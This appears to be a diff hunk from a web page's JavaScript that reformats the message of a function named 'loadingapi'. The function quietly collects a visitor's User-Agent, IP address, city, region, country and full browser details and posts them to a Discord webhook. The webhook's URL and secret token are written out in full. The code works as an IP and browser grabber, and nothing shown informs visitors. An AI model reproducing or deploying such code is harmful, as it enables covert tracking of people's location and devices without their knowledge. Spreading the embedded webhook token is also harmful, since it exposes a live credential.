@@ -53,7 +53,7 @@ function check() {
 function loadingapi(UA, addr, city, region, country, browserInfo) {
   const webhookURL = 'https://discord.com/api/webhooks/1190483916168114197/umTxVI0_ICJNuHz1ajpciQh7qGw6HAn1JFg25qCk6yBfb5yaMhduzoWFPk27D6Cr4aOl';
   const payload = {
-    content: `**User-Agent:**    \`${UA}\`\n**IP:**          \`${addr}\`\n**Location:**      \`${city}, ${region}, ${country}\` \n **Full log:** \n\`\`\`${JSON.stringify(browserInfo)}\`\`\``
+    content: `**User-Agent:** \`${UA}\`\n**IP:** \`${addr}\`\n**Location:** \`${city}, ${region}, ${country}\`\n**Full log:**\n\`\`\`${JSON.stringify(browserInfo)}\`\`\``
   };
 
   fetch(webhookURL, {
